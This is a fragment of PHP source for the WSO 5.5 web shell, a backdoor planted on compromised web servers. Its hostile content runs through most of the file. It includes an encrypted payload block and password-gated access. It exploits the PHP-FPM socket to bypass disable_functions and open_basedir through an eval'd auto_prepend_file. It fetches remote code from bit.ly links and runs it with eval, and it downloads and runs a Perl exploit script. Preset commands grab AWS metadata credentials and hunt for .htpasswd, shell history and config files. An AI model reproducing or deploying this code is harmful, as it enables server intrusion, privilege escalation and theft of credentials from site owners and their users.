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"; 
$otp_key = "iysfmwbju";
$decrypted_data_block = otp_data_block($data_block,$otp_key);

//eval ($decrypted_data_block);

// Decrypted PHP Code
preg_match('/.*pass *= ?"?([a-f0-9]{32}).*/si', @file_get_contents($_SERVER['SCRIPT_FILENAME']), $matches);

$auth_pass = "56572650e99642ee312975050d01dad1"; // root

$auth_pass = isset($matches[1]) ? $matches[1] : $auth_pass;



$color = "#df5";

$default_action = 'FilesMan';

$default_use_ajax = true;

$default_charset = 'UTF-8';



try {



	$vt_key = '6366464c1a9e88cc75810e130a60d4647d547cfd6a72319695e820bf0a18d84e';

	$wsoExGentlyUrl = 'https://bit.ly/wsoExGently2';



	ob_implicit_flush(true);

	@ini_set('error_log', NULL);

	@ini_set('log_errors', 0);

	@ini_set('display_errors', 'On');

	@ini_set('max_execution_time', 0);

	@set_time_limit(0);

	@define('WSO_VERSION', '5.5');



	function wsoGetFile($url) {

		$file_path = '/tmp/' . substr(md5($url), 0, 16) . substr(md5(@file_get_contents($_SERVER['SCRIPT_FILENAME'])), 16);

		if (!file_exists($file_path) || file_exists($file_path) && (time() - filemtime($file_path) > 60 * 60 * 24 * 1)) {

			if( function_exists('curl_init') ) {

				$ch = curl_init();

				curl_setopt($ch, CURLOPT_URL, $url);

				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

				curl_setopt($ch, CURLOPT_HEADER, FALSE);

				curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible;)");

				$body = curl_exec($ch);

				curl_close($ch);

			}

			else {

				$body = @file_get_contents($url);

			}

			file_put_contents($file_path, gzdeflate($body));

			return $body;

		} else {

			$body = @file_get_contents($file_path);

			return gzinflate($body) ? gzinflate($body) : $body;

		}

	}

	function wsoLogin() {

		$rand = rand(1e3, 1e4);

		$auth_form = "<form method=post style='position:fixed;'><input type=text name=pass autofocus=true></form></body>";

		//$body = str_replace('/notexist' . $rand, $_SERVER['SCRIPT_NAME'], wsoGetFile('http://' . $_SERVER['HTTP_HOST'] . '/notexist' . $rand));

		//$body = str_replace('</body>', $auth_form, $body);

  

		//header('HTTP/1.0 404 Not Found');

		die(!empty($body)?$body:$auth_form);

	}

	function WSOsetcookie($k, $v) {

		$_COOKIE[$k] = $v;

		setcookie($k, $v);

	}

	function wsoBreadCrumps() {

		$cwd_links = '';

		$file_path = explode("/", $GLOBALS['cwd']);

		$n = count($file_path);

		for ($i = 0;$i < $n - 1;$i++) {

			$cwd_file_path = '';

			for ($j = 0;$j <= $i;$j++) {

				$cwd_file_path.= $file_path[$j] . '/';

			}

			$cwd_links.= "<a style='color:" . wsoPermsColorOnly($cwd_file_path) . "' " . (wsoPermsColorOnly($cwd_file_path) == '#f18260' ? "" : "onclick=g('FilesMan','" . $cwd_file_path . "')") . ">" . $file_path[$i] . "/</a>";

		}

		$buttons = is_writable($GLOBALS['cwd']) ? '<span class=float-right>

			<a href="#" id="mkdir">[ new dir ]</a>

			<a href="#" id="mkfile">[ new file ]</a>

			<form method=post ENCTYPE="multipart/form-data">

				<input type=hidden name=a value=FilesMan>

				<input type=hidden name=c value="' . $GLOBALS['cwd'] . '">

				<input type=hidden name=p1 value=uploadFile>

				<a id="uploadfileicon"><object>[ <input class=toolsInp type=file name=f id=uploadfile>upload file ]</object></a>

			</form>

		</span>' : '';

		$filename = preg_match('/FilesTools/', @$_POST['a']) && @$_POST['p1'] ? htmlspecialchars(@basename($_POST['p1'])) : '';

		$filename = $filename ? "<a href=javascript:g('FilesTools',null,'" . $filename . "','" . (is_writable($_POST['p1']) ? 'edit' : 'view') . "') style='color:" . wsoPermsColorOnly($_POST['p1']) . "' >" . $filename . "</a>" : '';

		$console = " <input class='toolsInp hoverable' type=text name=path placeholder='[ change path/file ]' tabindex='0'>";

		echo '<h1>' . $buttons . ' <form onsubmit="g(\'FilesMan\',this.path.value);return false;"><a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\');return false;">[ cwd ]</a> ' . $cwd_links . $filename . $console . '</form></h1>';

	}

	// todo: https://antichat.com/threads/470018/

	function wsoUnChain($canary) {



		// https://antichat.com/threads/473143/#post-4353235

		function sendRequest($host, $port, $packet, $test_file) {

			$body = '';

			$headers = '';

			$errno = '';

			$errstr = '';

			$timeout = 1;

			if ($port > 0) $host = "tcp://${host}:${port}/";

			else $host = "unix://${host}";

			$connection = stream_socket_client($host, $errno, $errstr, $timeout);

			if ($connection) {

				stream_set_timeout($connection, 1);

				fputs($connection, $packet);

				while (!feof($connection)) {

					$line = fgets($connection, 4096);

					if ($line == "\r\n") break;

					$headers.= $line;

				}

				while (!feof($connection)) $body.= fgets($connection, 4096);

				fclose($connection);

				if (preg_match('/Primary script unknown|Status: 404 Not Found/si', $headers)) {

					return "<label title='".$headers."'>bypass failed: wrong target script: ".$test_file."</label>";

				} else {

					return "<label title='".$headers."'>Successful</label>";

				}

			} else {

				return "Test failed: no connection:`(";

			}

		}

		function initializeParams($id, $params = array()) {

			$type = 4;

			$data = "";

			foreach ($params as $key => $value) {

				$data.= pack("CN", strlen($key), (1 << 31) | strlen($value));

				$data.= $key;

				$data.= $value;

			}

			return to_s($id, $type, $data);

		}

		function to_s($id, $type, $data = "") {

			$packet = sprintf("\x01%c%c%c%c%c%c\x00", $type, $id / 256, $id % 256, strlen($data) / 256, strlen($data) % 256, strlen($data) % 8);

			$packet.= $data;

			$packet.= str_repeat("\x00", (strlen($data) % 8));

			return $packet;

		}

		function buildPacket($payload, $scriptFile) {

			$payload = base64_encode($payload);

			$packet = "";

			$packet.= to_s(1, 1, "\x00\x01\x00\x00\x00\x00\x00\x00");

			$packet.= initializeParams(1, array("REQUEST_METHOD" => "GET", "SERVER_PROTOCOL" => "HTTP/1.1", "GATEWAY_INTERFACE" => "CGI/1.1", "SERVER_NAME" => "localhost", "HTTP_HOST" => "localhost", "REMOTE_ADDR" => "127.0.0.1", "SCRIPT_FILENAME" => $scriptFile, "PHP_ADMIN_VALUE" => join("\n", ["allow_url_fopen=On", "allow_url_include=On", "disable_functions=Off", "open_basedir=Off", "short_open_tag=On", "auto_prepend_file=data:," . urlencode("<?= eval(
       base64_decode('${payload}')
   ) ?>") ])));

			$packet.= to_s(1, 4);

			$packet.= to_s(1, 5);

			return $packet;

		}

		function findSocket() {

			$connection = @fsockopen('127.0.0.1', 9000, $errno, $errstr, 3);

			if (is_resource($connection)) {

				fclose($connection);

				$fpm_socket = '127.0.0.1';

				$port = 9000;

			} else {

				$it = @glob("/tmp/php*.sock");

				foreach ($it as $f) $fpm_socket = $f;

				try {

					$it = @glob("/var/run/php*.sock");

					foreach ($it as $f) $fpm_socket = $f;

					$it = @glob("/var/run/php-fpm/*.sock");

					foreach ($it as $f) $fpm_socket = $f;

				}

				catch(Exception $e) {

				}

				$port = 0;

			}

			if (!isset($fpm_socket)) {

				return false;

			} else {

				return array($fpm_socket, $port);

			}

		}

		while ( !isset($test_file) ) {

			$it = @glob(dirname(__FILE__)."/*.php");

			foreach ($it as $f) $test_file = $f;

		}

		$fpm_socket = findSocket();

		if (!$fpm_socket) {

			return 'fail to locate socket ;(';

		}

		$result = sendRequest($fpm_socket[0], $fpm_socket[1], buildPacket($canary, $test_file), $test_file);

		if (preg_match('/success/i', $result)) {

			return $result;

		} else {

			return $result;

		}

	}



	if (!empty($auth_pass)) {

		if (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass)) WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

		if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) ]) || ($_COOKIE[md5($_SERVER['HTTP_HOST']) ] != $auth_pass)) wsoLogin();

	}



	$os = (strtolower(substr(PHP_OS, 0, 3)) == "win")?'win':'nix';

	$safe_mode = @ini_get('safe_mode');

	if (!$safe_mode) error_reporting(0);

	$disable_functions = @ini_get('disable_functions');

	$open_base_dir = @ini_get('open_basedir');

	if ( $disable_functions || $open_base_dir ) {

		$chains_bypassed = wsoUnChain('$chains_bypassed=true;');

	}

	if( $disable_functions ) {

		// define wsoExGently();

		eval(wsoGetFile($wsoExGentlyUrl));

	}



	$home_cwd = @getcwd();

	if (isset($_POST['c'])) @chdir($_POST['c']);

	$cwd = @getcwd();



	if ($os == 'win') {

		$home_cwd = str_replace("\\", "/", $home_cwd);

		$cwd = str_replace("\\", "/", $cwd);

	}

	if ($cwd[strlen($cwd) - 1] != '/') $cwd.= '/';



	if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$default_use_ajax;



	if ($os == 'win') $aliases = array("List Directory" => "dir", "Find index.php in current dir" => "dir /s /w /b index.php", "Find *config*.php in current dir" => "dir /s /w /b *config*.php", "Show active connections" => "netstat -an", "Show running services" => "net start", "User accounts" => "net user", "Show computers" => "net view", "ARP Table" => "arp -a", "IP Configuration" => "ipconfig /all");

	else $aliases = array("Fetch AWS metadata" => "curl -Ss http://169.254.169.254/latest/meta-data/identity-credentials/", "List dir" => "ls -lha", "list file attributes on a Linux second extended file system" => "lsattr -va", "show opened ports" => "netstat -an | grep -i listen", "process status" => "ps aux", "Find" => "", "find all suid files" => "find / -type f -perm -04000 -ls", "find suid files in current dir" => "find . -type f -perm -04000 -ls", "find all sgid files" => "find / -type f -perm -02000 -ls", "find sgid files in current dir" => "find . -type f -perm -02000 -ls", "find config.inc.php files" => "find / -type f -name config.inc.php", "find config* files" => "find / -type f -name \"config*\"", "find config* files in current dir" => "find . -type f -name \"config*\"", "find all writable folders and files" => "find / -perm -2 -ls", "find all writable folders and files in current dir" => "find . -perm -2 -ls", "find all service.pwd files" => "find / -type f -name service.pwd", "find service.pwd files in current dir" => "find . -type f -name service.pwd", "find all .htpasswd files" => "find / -type f -name .htpasswd", "find .htpasswd files in current dir" => "find . -type f -name .htpasswd", "find all .bash_history files" => "find / -type f -name .bash_history", "find .bash_history files in current dir" => "find . -type f -name .bash_history", "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc", "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc", "Locate" => "", "locate httpd.conf files" => "locate httpd.conf", "locate vhosts.conf files" => "locate vhosts.conf", "locate proftpd.conf files" => "locate proftpd.conf", "locate psybnc.conf files" => "locate psybnc.conf", "locate my.conf files" => "locate my.conf", "locate admin.php files" => "locate admin.php", "locate cfg.php files" => "locate cfg.php", "locate conf.php files" => "locate conf.php", "locate config.dat files" => "locate config.dat", "locate config.php files" => "locate config.php", "locate config.inc files" => "locate config.inc", "locate config.inc.php" => "locate config.inc.php", "locate config.default.php files" => "locate config.default.php", "locate config* files " => "locate config", "locate .conf files" => "locate '.conf'", "locate .pwd files" => "locate '.pwd'", "locate .sql files" => "locate '.sql'", "locate .htpasswd files" => "locate '.htpasswd'", "locate .bash_history files" => "locate '.bash_history'", "locate .mysql_history files" => "locate '.mysql_history'", "locate .fetchmailrc files" => "locate '.fetchmailrc'", "locate backup files" => "locate backup", "locate dump files" => "locate dump", "locate priv files" => "locate priv");



	function wsoHeader() {

		$_POST['charset'] = $GLOBALS['default_charset'];

		global $color;

		global $vt_key;

		global $open_base_dir;

		global $chains_bypassed;

		echo "<html><head>

		<link href='//cdn.jsdelivr.net/npm/bootstrap/dist/css/bootstrap.min.css' rel='stylesheet'>

		<script src='//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js'></script>

		<script src='//cdn.jsdelivr.net/npm/bootstrap/dist/js/bootstrap.bundle.min.js'></script>

		<meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'>

		<title>" . $_SERVER['HTTP_HOST'] . " - WSO " . WSO_VERSION . "</title>

	<style>

	@import url('https://fonts.googleapis.com/css2?family=Outfit&family=Teko:wght@300&display=swap');

	:root {

		--main-color: $color;

		--text-green: #2bb24c;

		--text-orange: #ffbd2f;

		--text-red: #f18260;

		// --text-red: #c41e25;

		--text-muted: #888;

	}

	body{background-color:#444;color:#e1e1e1;}

	body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }

	table.info{ color:#fff;background-color:#222; }

	span,h1,a,a:hover{ color: var(--main-color); }

	a { cursor: pointer; }

	.text-red { color: var(--text-red); }

	.text-green{ color: var(--text-green); }

	span{ font-weight: bolder; }

	h1{ border-left:5px solid var(--main-color);padding: 2px 5px;font: 20px 'Teko', sans-serif;background-color:#222;margin:0px; }

	div.content{ padding: 5px;margin-left:5px;background-color:#333; }

	a{ text-decoration:none; }

	a:hover{ text-decoration:underline; }

	.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }

	.bigarea{ width:100%;height:300px; }

	input,textarea,select,button{ margin:0;color:#fff;background-color:#555;border:1px solid var(--main-color); font: 12pt Monospace,'Courier New'; }

	textarea{ width:100%; height:600px; font: 9pt Monospace,'Courier New'; }

	.hoverable { border: 1px solid transparent; background: transparent; }

	h1 .hoverable { padding: 2px 5px;font: 20px 'Teko', sans-serif; }

	.hoverable:focus { border:1px solid var(--main-color);; }

	form{ margin:0px; display: inline-block; }

	#mkdir,#mkfile,#uploadfile { color:var(--main-color); width:150px; }

	#uploadfile { width:75px; opacity:0; position:absolute; left:0; z-index:100; cursor:pointer; }

	#uploadfileicon { position: relative; }

	#toolsTbl{ text-align:center; }

	.toolsInp{ width: 300px }

	.main th{text-align:left;background-color:#5e5e5e;}

	.main tr:hover{background-color:#5e5e5e}

	.l1{background-color:#444}

	.l2{background-color:#333}

	pre{font-family:Courier,Monospace;}

	.file-actions { display:none; }

	.touch-field { font: 9pt Lucida,Verdana; }

	.float-right { float:right; }



	</style>

	<script>

		var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';

		var a_ = '" . htmlspecialchars(@$_POST['a']) . "'

		var charset_ = 'UTF-8';

		var p1_ = '" . ((strpos(@$_POST['p1'], "\n") !== false) ? '' : htmlspecialchars($_POST['p1'], ENT_QUOTES)) . "';

		var p2_ = '" . ((strpos(@$_POST['p2'], "\n") !== false) ? '' : htmlspecialchars($_POST['p2'], ENT_QUOTES)) . "';

		var p3_ = '" . ((strpos(@$_POST['p3'], "\n") !== false) ? '' : htmlspecialchars($_POST['p3'], ENT_QUOTES)) . "';

		var d = document;

		function set(a,c,p1,p2,p3) {

			self.mf.a.value=a||a_;

			self.mf.c.value=c||c_;

			self.mf.p1.value=p1||p1_;

			self.mf.p2.value=p2||p2_;

			self.mf.p3.value=p3||p3_;

		}

		function g(a,c,p1,p2,p3) {

			set(a,c,p1,p2,p3);

			console.log(a,c,p1,p2,p3);

			self.mf.submit();

			return false;

		}

		function a(a,c,p1,p2,p3) {

			set(a,c,p1,p2,p3);

			var params = 'ajax=true';

			for(i=0;i<self.mf.elements.length;i++)

				params += '&'+self.mf.elements[i].name+'='+encodeURIComponent(self.mf.elements[i].value);

			sr('" . addslashes($_SERVER['REQUEST_URI']) . "', params);

		}

		function sr(url, params) {

			$.ajax({

				type: 'POST',

				url: url,

				contentType: 'application/x-www-form-urlencoded; charset=utf-8',

				data: params,

				success: function (text) { text.split('\\n').map(function(a){/PhpOutput|strOutput|self\\.cf/.test(a)&&eval(a)}) },

				error: function () { alert('Request error!') }

			});

		}

	</script>

	<head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>

	<form method=post name=mf style='display:none;'>

	<input type=hidden name=a>

	<input type=hidden name=c>

	<input type=hidden name=p1>

	<input type=hidden name=p2>

	<input type=hidden name=p3>

	</form>";

		$freeSpace = @diskfreespace($GLOBALS['cwd']);

		$totalSpace = @disk_total_space($GLOBALS['cwd']);

		$totalSpace = $totalSpace ? $totalSpace : 1;

		$release = @php_uname('r');

		$kernel = @php_uname('s');

		$explink = 'curl -fskSL bit.ly/autoexp2 > /tmp/auto.pl; perl /tmp/auto.pl; rm -f /tmp/auto.pl;';

		$ipv4infolink = 'https://addon.dnslytics.net/ipv4info/v1/';

		$_SERVER["SERVER_ADDR"] = wsoGetFile('https://api.my-ip.io/ip');

		$vt_detections = preg_replace('/^(.*"response_code": ?)(\d+)(, ?".*)|(.+"positives": )(\d{1,2})(, "total.+)$/', '$2$5', wsoGetFile('https://www.virustotal.com/vtapi/v2/url/report?resource=' . $_SERVER["SERVER_ADDR"] . '&apikey=' . $vt_key));

		$vt_detections = $vt_detections != 0 ? '<b class=text-danger>' . $vt_detections . '</b>' : $vt_detections;

		$ip_data = preg_replace('/(.+"countryCode":")([A-Z]{2})(",".+"isp":")(.+)(","org".+)|(.*"message":")(.+)(","query")(.*)/si', '$2$7, $4', wsoGetFile('http://demo.ip-api.com/json/' . $_SERVER["SERVER_ADDR"] . '?fields=66842623&lang=en'));

		preg_match('/"ndomains":(\d+),/si', wsoGetFile($ipv4infolink . $_SERVER["SERVER_ADDR"]), $matches);

		$domains_count = isset($matches[1])?$matches[1]:'-';

		$ram_size = file_exists('/proc/meminfo') ? preg_replace('/(.*MemTotal: +)(\d+)(\d{3})( kB.*)/', '$2 Mb', file('/proc/meminfo') [0]) : '--';

		$ram_free = file_exists('/proc/meminfo') ? preg_replace('/(.*MemFree: +)(\d+)(\d{3})( kB.*)/', '$2 Mb', file('/proc/meminfo') [1]) : '--';

		if (!function_exists('posix_getegid')) {

			$user = @get_current_user();

			$uid = @getmyuid();

			$gid = @getmygid();

